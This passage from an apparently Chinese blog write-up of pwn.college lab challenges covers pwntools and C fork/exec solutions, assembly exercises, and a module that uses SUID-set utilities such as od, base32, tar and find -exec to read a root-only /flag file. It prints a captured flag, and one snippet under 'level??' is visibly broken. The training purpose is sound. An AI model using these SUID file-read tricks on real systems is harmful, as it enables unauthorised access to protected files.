force auto-parentheses by using ‘/‘ as the first character<br>of a line.  For example::</p><div class="hljs code-wrapper"><pre><code> In [1]: /globals             # becomes &#39;globals()&#39;</code></pre></div><p>Note that the ‘/‘ MUST be the first character on the line!  This<br>won’t work::</p><div class="hljs code-wrapper"><pre><code> In [2]: print /globals    # syntax error</code></pre></div><p>In most cases the automatic algorithm should work, so you should<br>rarely need to explicitly invoke /. One notable exception is if you<br>are trying to call a function with a list of tuples as arguments (the<br>parenthesis will confuse IPython)::</p><div class="hljs code-wrapper"><pre><code> In [1]: zip (1,2,3),(4,5,6)  # won&#39;t work</code></pre></div><p>but this will work::</p><div class="hljs code-wrapper"><pre><code> In [2]: /zip (1,2,3),(4,5,6) ------&gt; zip ((1,2,3),(4,5,6)) Out[2]= [(1, 4), (2, 5), (3, 6)]</code></pre></div><p>IPython tells you that it has altered your command line by<br>displaying the new command line preceded by –&gt;.  e.g.::</p><div class="hljs code-wrapper"><pre><code> In [18]: callable list -------&gt; callable (list)</code></pre></div></li><li><p>Auto-Quoting</p><p> You can force auto-quoting of a function’s arguments by using ‘,’ as<br> the first character of a line.  For example::</p><div class="hljs code-wrapper"><pre><code>  In [1]: ,my_function /home/me   # becomes my_function(&quot;/home/me&quot;)</code></pre></div><p> If you use ‘;’ instead, the whole argument is quoted as a single<br> string (while ‘,’ splits on whitespace)::</p><div class="hljs code-wrapper"><pre><code>  In [2]: ,my_function a b c   # becomes my_function(&quot;a&quot;,&quot;b&quot;,&quot;c&quot;)  In [3]: ;my_function a b c   # becomes my_function(&quot;a b c&quot;)</code></pre></div><p> Note that the ‘,’ MUST be the first character on the line!  This<br> won’t work::</p><div class="hljs code-wrapper"><pre><code>  In [4]: x = ,my_function /home/me    # syntax error</code></pre></div></li></ol></li></ul><h3 id="level16"><a href="#level16" class="headerlink" title="level16"></a>level16</h3><p>从这题开始使用这个脚本, glob可根据 Unix 终端所用规则找出所有匹配特定模式的路径名</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> glob <br><span class="hljs-keyword">import</span> pwn <br>p= pwn.process(glob.glob(<span class="hljs-string">&quot;/challenge/embryo*&quot;</span>), stdout=pwn.PIPE, stdin=pwn.PIPE) <br>p.sendline(<span class="hljs-string">&quot;password&quot;</span>)    <span class="hljs-comment"># 要加这一个</span><br><span class="hljs-built_in">print</span>(p.read().decode())     <br></code></pre></div></td></tr></table></figure><h3 id="level17"><a href="#level17" class="headerlink" title="level17"></a>level17</h3><p>这题检查参数argv[1]. 要注意的是pwntools的process方法以前我都是直接使用process(“file/path”), 实际上是写到了argv[]的第0个位置, 如果<code>executable(Path to the binary to execute)</code>为None, 则会使用argv[0], 这就是为什么往参数里写路径就可以执行的原因.</p><p>写成这样即可:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> glob <br><span class="hljs-keyword">import</span> pwn <br>p= pwn.process(glob.glob(<span class="hljs-string">&quot;/challenge/embryo*&quot;</span>)+[<span class="hljs-string">&quot;gdncphvdkz&quot;</span>] , stdout=pwn.PIPE, stdin=pwn.PIPE) <br><br><span class="hljs-built_in">print</span>(p.read().decode())     <br></code></pre></div></td></tr></table></figure><h3 id="level18-21"><a href="#level18-21" class="headerlink" title="level18-21"></a>level18-21</h3><ul><li>18: 是环境变量, 在process的参数里加个<code>env=&#123;“balabala”=“blabla”&#125;</code>就可以了.</li><li>19: 是重定向stdin.</li></ul><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> glob<br><span class="hljs-keyword">import</span> pwn<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/tmp/rmxgbo&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> o:<br>    o.write(<span class="hljs-string">&quot;kmtxemmo\n&quot;</span>)<br>p= pwn.process(glob.glob(<span class="hljs-string">&quot;/challenge/embryo*&quot;</span>), stdout=pwn.PIPE, stdin=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/tmp/rmxgbo&quot;</span>))<br><br><span class="hljs-built_in">print</span>(p.read().decode()) <br></code></pre></div></td></tr></table></figure><p>有一个问题: 上面的代码应该都是正确的, 但是只有再补充一句p.interactive()的时候最后两行flag才显示出来, 原因暂未知晓</p><ul><li>20: </li></ul><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> glob<br><span class="hljs-keyword">import</span> pwn<br>p= pwn.process(glob.glob(<span class="hljs-string">&quot;/challenge/embryo*&quot;</span>), stdout=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/tmp/tkpich&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>), stdin=pwn.PIPE)<br></code></pre></div></td></tr></table></figure><ul><li>21<br>  需要清空环境变量.<br>  注意到process这个函数中的env默认会继承python的环境变量就可以了, 必须手动清空</li></ul><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> glob,pwn<br>p= pwn.process(glob.glob(<span class="hljs-string">&quot;/challenge/embryo*&quot;</span>), stdout=pwn.PIPE, stdin=pwn.PIPE, env=&#123;&#125;)<br><br><span class="hljs-built_in">print</span>(p.read().decode())<br></code></pre></div></td></tr></table></figure><h3 id="level-22-28"><a href="#level-22-28" class="headerlink" title="level 22-28"></a>level 22-28</h3><ul><li>22: 这部分是使用命令行执行python来执行程序的,  比较简单.</li></ul><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> glob,pwn<br>p= pwn.process(glob.glob(<span class="hljs-string">&quot;/challenge/embryo*&quot;</span>))<br>p.interactive()<br></code></pre></div></td></tr></table></figure><ul><li>23-28: 重复一遍上面的工作, 比如0 environment, redirect stdin and out, 等等这些.</li></ul><h3 id="level-29-34"><a href="#level-29-34" class="headerlink" title="level 29-34"></a>level 29-34</h3><p>从这个开始就要编译C程序了, 29写下面这一段, 30输入一个密码.</p><p>值得注意的是, 如果直接调用execve, 那么会导致bash在执行.</p><p>如果没有waitpid, 那么子进程会被/docker/init(在我的ubuntu20.04上是/sbin/init)接管. </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">pwncollege</span><span class="hljs-params">()</span></span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[], <span class="hljs-keyword">char</span>** envp)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> pid = fork();<br>    <span class="hljs-keyword">if</span>(pid == <span class="hljs-number">0</span>)&#123;<span class="hljs-comment">//child process</span><br>        <span class="hljs-keyword">int</span> r=execve(<span class="hljs-string">&quot;/challenge/embryoio_level30&quot;</span>, argv, envp);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, r);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        waitpid(pid);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Parent process termianted.\n&quot;</span>);<br><br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li><strong>31:</strong> 真的绝了, “a”原本写的是””, 父进程都不对, 过了一会儿重新编译又好了, 莫名其妙.</li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">pwncollege</span><span class="hljs-params">()</span></span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv, <span class="hljs-keyword">char</span>** envp)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> pid = fork();<br><br>    <span class="hljs-keyword">if</span>(pid == <span class="hljs-number">0</span>)&#123;<span class="hljs-comment">//child process</span><br>        <span class="hljs-comment">//int r=execve(&quot;/challenge/embryoio_level31&quot;, argv, envp);</span><br>        <span class="hljs-keyword">int</span> r = execl(<span class="hljs-string">&quot;/challenge/embryoio_level31&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;lndhvgwxjx&quot;</span>, <span class="hljs-literal">NULL</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, r);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        waitpid(pid);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Parent process termianted.\n&quot;</span>);<br><br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li>32: 直接修改envp好像会出问题, 原因未知. </li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">pwncollege</span><span class="hljs-params">()</span></span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv, <span class="hljs-keyword">char</span>** envp)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> pid = fork();<br>    <span class="hljs-keyword">char</span>* argvs[<span class="hljs-number">3</span>];<br>    argvs[<span class="hljs-number">1</span>]=<span class="hljs-string">&quot;jxdefy=fbilpksemj&quot;</span>;    <span class="hljs-comment">//暂且先手动设置吧</span><br>    argvs[<span class="hljs-number">2</span>]=<span class="hljs-literal">NULL</span>;<br>    argvs[<span class="hljs-number">0</span>]=<span class="hljs-string">&quot;sldkfj&quot;</span>;<br>    <span class="hljs-keyword">if</span>(pid == <span class="hljs-number">0</span>)&#123;<span class="hljs-comment">//child process</span><br>        <span class="hljs-keyword">int</span> r = execle(<span class="hljs-string">&quot;/challenge/embryoio_level32&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;lndhvgwxjx&quot;</span>, <span class="hljs-literal">NULL</span>, argvs);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, r);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        waitpid(pid);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Parent process termianted.\n&quot;</span>);<br><br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li>33: 这个就是c语言版本的重定位, 还附带父进程检查的那种. 考虑到execve系列函数会直接继承原来进程的大部分属性, 比如输入输出流, 所以直接对c程序重定向即可, 子进程直接继承.</li><li>34: 输出重定向.</li></ul><h3 id="level35"><a href="#level35" class="headerlink" title="level35-"></a>level35-</h3><ul><li><p>35: 用脚本运行, 可以不需要fork, 直接execve</p></li><li><p>36: 输出要是到cat的PIPE, 直接在命令行里输入: <code>./c | cat</code>即可</p></li><li><p>37: <code>./c | grep -E &quot;*&quot;</code> 结束</p></li><li><p>38: <code>./c | sed &quot;=&quot;</code> </p></li><li><p>39: <code>./c  | rev | rev</code> </p></li><li><p>40: 使用管道重定向stdin, 去看了下c中的PIPE操作.暂时没有发现怎么用在这道题目上.</p><p><del>直接来一手三重套娃, 这样子cat就不会马上终止了</del>. md不用也可以, 是我想复杂了.</p></li></ul><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">./cat | cat | /challenge/embryoio_level40<br></code></pre></div></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//cat.</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">1024</span>];<br>    <span class="hljs-keyword">int</span> n;<br>    <span class="hljs-keyword">int</span> fd = argc == <span class="hljs-number">1</span> ? <span class="hljs-number">0</span> : open(argv[<span class="hljs-number">1</span>],<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">while</span> ((n = read(fd,buf,<span class="hljs-number">1024</span>)) &gt; <span class="hljs-number">0</span> &amp;&amp; write(<span class="hljs-number">1</span>,buf,n) &gt; <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li>41: 重定向stdout. 一样做法.</li><li>42: <code>bash x.sh | cat</code></li><li>43: grep</li><li>44: sed</li><li>45: rev</li><li>46: 我累了</li></ul><h3 id="level"><a href="#level" class="headerlink" title="level??"></a>level??</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> glob<br><span class="hljs-keyword">import</span> pwn<br>pwn.context.log_level = <span class="hljs-string">&quot;DEBUG&quot;</span><br>p2 = pwn.process([<span class="hljs-string">&quot; /usr/bin/sed&quot;</span>, <span class="hljs-string">&quot;-e&quot;</span>, <span class="hljs-string">&quot;s/x/×/&quot;</span>])<br>p1 = pwn.process(glob.glob( <span class="hljs-string">&quot; /chailenge/enbryo* &quot;</span>)，stdout=p2.stdin)<br><span class="hljs-built_in">print</span>(p2.readall())<br></code></pre></div></td></tr></table></figure><h1 id="module-2"><a href="#module-2" class="headerlink" title="module 2"></a>module 2</h1><ul><li><p><a href="https://wiki.archlinux.org/title/File_permissions_and_attributes">文件权限</a> </p></li><li></li></ul><h2 id="WP-1"><a href="#WP-1" class="headerlink" title="WP"></a>WP</h2><p>这部分的题目就是利用被设置suid的程序来以root的权限去读文件, 无论看起来是有多么的不可能.</p><p><code>cat head tail rev nano emacs vim od more less sort hd(hexdump) xxd base32(64) split gzip bzip2 zip&amp;unzip</code><br><code>tar ar cpio genisoimage env find make </code></p><ul><li>od: <code>od -t x8z -v -w 10 /flag</code> 硬是拼出来. </li></ul><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">0000000 6c6c6f632e6e7770 714f6f417b656765 685834544b387868 4e354550757a575a  &gt;pwn.college&#123;AoOqhx8KT4XhZWzuPE5N&lt;<br>0000040 2e337a6d50723671 4d734d54557a5851 0a7d577a49314d54                   &gt;q6rPmz3.QXzUTMsMTM1IzW&#125;.&lt;<br>0000070<br></code></pre></div></td></tr></table></figure><ul><li><p><code>hd /flag</code> (hexdump)</p></li><li><p><code>xxd -c60 /flag</code> 每行60个</p></li><li><p><code>base32 /flag | base32 -d</code> </p></li><li><p>split: split file into pieces. <code>split /flag</code> </p></li><li><p><code>gzip -c /flag | gzip -cd </code> </p></li><li><p>bzip2 有新的机制, 不过命令行参数和gzip非常接近</p></li><li><p><code>zip - /flag &gt; aa</code> and then<code>cat aa</code>    or    <code>unzip -p aa</code> </p></li><li><p><code>tar cf flag.tar flag</code> then <code>tar  -xOf flag.tar</code> 研究了半天tar的参数, main operation那几个参数每次必须加上.f参数后紧跟文件名</p></li><li><p><code>ar c flag.ar flag</code> then <code>cat flag.ar</code> 发现经过root用户创建完archive之后直接就对其他用户可读了…更简单了</p></li><li><p>(23- )  cpio genisoimage: ???</p><ul><li><p><code>echo &quot;/flag&quot; | cpio -ov &gt; ~/flag.cpio</code> then <code>cat flagcpio</code> 不是直接将/flag放到cpio的stdin中……他只要<u>name-list</u>……</p></li><li></li></ul></li><li><p>env也行?太神奇了. <code>env cat /flag</code> </p></li><li><p><code>find /flag -maxdepth 0 -exec cat &#39;&#123;&#125;&#39; \;</code> </p></li><li></li></ul><h1 id="module-3"><a href="#module-3" class="headerlink" title="module 3"></a>module 3</h1><p>就是汇编代码的写</p><h2 id="3-简单乘法"><a href="#3-简单乘法" class="headerlink" title="3 简单乘法"></a>3 简单乘法</h2><p>要注意mul指令默认被乘数放在rax里面, 乘数由我们指定, 结果是拼接而成的: <strong>RDX:RAX</strong> </p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br><span class="hljs-keyword">from</span> glob <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>p = process(glob(<span class="hljs-string">&quot;/challenge/e*&quot;</span>))<br><br>shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">mov rax, rdi</span><br><span class="hljs-string">mov rcx, rdx</span><br><span class="hljs-string">mul rsi</span><br><span class="hljs-string">add rax, rcx</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>p.send(asm(shellcode))<br>p.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="4-5-除法"><a href="#4-5-除法" class="headerlink" title="4-5 除法"></a>4-5 除法</h2><p>被除数放在<strong>RAX</strong>, 除数待定, 结果放在 <strong>RAX</strong>, 余数放在<strong>RDX</strong> </p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">mov rax, rdi</span><br><span class="hljs-string">div rsi</span><br><span class="hljs-string">mov rax, rdx</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure><h2 id="6-低位寄存器的名称"><a href="#6-低位寄存器的名称" class="headerlink" title="6: 低位寄存器的名称"></a>6: 低位寄存器的名称</h2><p>低位寄存器的名称要特别注意, rdi就是这么写错了, mov的两个操作数如果长度不匹配会报错:<code>unsupported instruction &#39;mov&#39;</code> </p><table><thead><tr><th><strong>Name</strong></th><th>Notes</th><th>Type</th><th>64</th><th>32</th><th>16</th><th>8</th></tr></thead><tbody><tr><td>rax</td><td>Values are returned from functions in this register.</td><td>scratch</td><td>rax</td><td>eax</td><td>ax</td><td>ah and al</td></tr><tr><td>rcx</td><td>Typical scratch register.  Some instructions also use it as a counter.</td><td>scratch</td><td>rcx</td><td>ecx</td><td>cx</td><td>ch and cl</td></tr><tr><td>rdx</td><td>Scratch register.</td><td>scratch</td><td>rdx</td><td>edx</td><td>dx</td><td>dh and dl</td></tr><tr><td><em>rbx</em></td><td><em>Preserved register: don’t use it without saving it!</em></td><td><em>preserved</em></td><td><em>rbx</em></td><td><em>ebx</em></td><td><em>bx</em></td><td><em>bh and bl</em></td></tr><tr><td><em>rsp</em></td><td><em>The stack pointer.  Points to the top of the stack (details coming soon!)</em></td><td><em>preserved</em></td><td><em>rsp</em></td><td><em>esp</em></td><td><em>sp</em></td><td><em>spl</em></td></tr><tr><td><em>rbp</em></td><td><em>Preserved register.</em></td><td><em>preserved</em></td><td><em>rbp</em></td><td><em>ebp</em></td><td><em>bp</em></td><td><em>bpl</em></td></tr><tr><td>rsi</td><td>Scratch register.  Function argument #2 in 64-bit Linux</td><td>scratch</td><td>rsi</td><td>esi</td><td>si</td><td>sil</td></tr><tr><td>rdi</td><td>Scratch register.  Function argument #1 in 64-bit Linux</td><td>scratch</td><td>rdi</td><td>edi</td><td>di</td><td>dil</td></tr><tr><td>r8</td><td>Scratch register.  These were added in 64-bit mode</td><td>scratch</td><td>r8</td><td>r8d</td><td>r8w</td><td>r8b</td></tr><tr><td>r9</td><td>Scratch register.</td><td>scratch</td><td>r9</td><td>r9d</td><td>r9w</td><td>r9b</td></tr><tr><td>r10</td><td>Scratch register.</td><td>scratch</td><td>r10</td><td>r10d</td><td>r10w</td><td>r10b</td></tr><tr><td>r11</td><td>Scratch register.</td><td>scratch</td><td>r11</td><td>r11d</td><td>r11w</td><td>r11b</td></tr><tr><td><em>r12</em></td><td><em>Preserved register.  You can use it, but you need to save and restore it.</em></td><td><em>preserved</em></td><td><em>r12</em></td><td><em>r12d</em></td><td><em>r12w</em></td><td><em>r12b</em></td></tr><tr><td><em>r13</em></td><td><em>Preserved register.</em></td><td><em>preserved</em></td><td><em>r13</em></td><td><em>r13d</em></td><td><em>r13w</em></td><td><em>r13b</em></td></tr><tr><td><em>r14</em></td><td><em>Preserved register.</em></td><td><em>preserved</em></td><td><em>r14</em></td><td><em>r14d</em></td><td><em>r14w</em></td><td><em>r14b</em></td></tr><tr><td><em>r15</em></td><td><em>Preserved register.</em></td><td><em>preserved</em></td><td><em>r15</em></td><td><em>r15d</em></td><td><em>r15w</em></td><td><em>r15b</em></td></tr></tbody></table><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">mov al, dil</span><br><span class="hljs-string">mov bx, si</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure><h2 id="8-9-bitwise-op"><a href="#8-9-bitwise-op" class="headerlink" title="8-9 bitwise op"></a>8-9 bitwise op</h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-number">8.</span><br>shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">xor rax, rax</span><br><span class="hljs-string">or  rax, rdi</span><br><span class="hljs-string">and rax, rsi</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-number">9.</span><br>shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">and rdi, 1</span><br><span class="hljs-string">xor rdi, 1</span><br><span class="hljs-string">xor rax, rax</span><br><span class="hljs-string">or rax, rdi</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure><h2 id="10-开始内存操作"><a href="#10-开始内存操作" class="headerlink" title="10. 开始内存操作"></a>10. 开始内存操作</h2><p>注意add没有 <code>add mem, imm</code>这种形式, 因为时钟周期根本不够 </p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode=<span class="hljs-string">&quot;&quot;&quot; </span><br><span class="hljs-string">mov rdx, 0x404000 </span><br><span class="hljs-string">mov rcx, [rdx] </span><br><span class="hljs-string">mov rax, rcx </span><br><span class="hljs-string">add rcx, 0x1337 </span><br><span class="hljs-string">mov [rdx], rcx </span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure><p>11.简单的rax, eax, ax, ah, al的使用.</p><p>12.要注意时钟周期的问题. 常数要先移动到寄存器</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">mov rax, 0xdeadbeef00001337</span><br><span class="hljs-string">mov rbx, 0x000000C0FFEE0000</span><br><span class="hljs-string">mov [rdi], rax</span><br><span class="hljs-string">mov [rsi], rbx</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure><p>13.利用地址偏移, 简单的.</p><h2 id="14-16-栈相关指令-太简单了-都是些基础题-过了就算了"><a href="#14-16-栈相关指令-太简单了-都是些基础题-过了就算了" class="headerlink" title="14-16.栈相关指令. 太简单了, 都是些基础题, 过了就算了"></a>14-16.栈相关指令. 太简单了, 都是些基础题, 过了就算了</h2><h2 id="17-跳转"><a href="#17-跳转" class="headerlink" title="17. 跳转"></a>17. 跳转</h2><p>nop的数量数错了, 诶他说的是0x51 bytes from current position, 但是这指的是jmp后面一条指令的地址. 不是jmp的起始地址…..</p><p>还要注意<code>绝对跳转只能是间接跳转(line 6)</code>( 要和<code>条件跳转只能是直接跳转</code>一起记清楚 )</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">jmp L1</span><br><span class="hljs-string">(0x51 nops)</span><br><span class="hljs-string">pop rdi</span><br><span class="hljs-string">mov rcx, 0x403000</span><br><span class="hljs-string">jmp rcx</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure><p>18.if-elif-else连环, 要注意的是他说[rdi]是一个双字, 可能是一个负数, 所以我第一次写的<code>QWORD PTR</code>就错了, 只能是<code>DWORD PTR</code> </p><figure class="highlight python"><table><tr><td 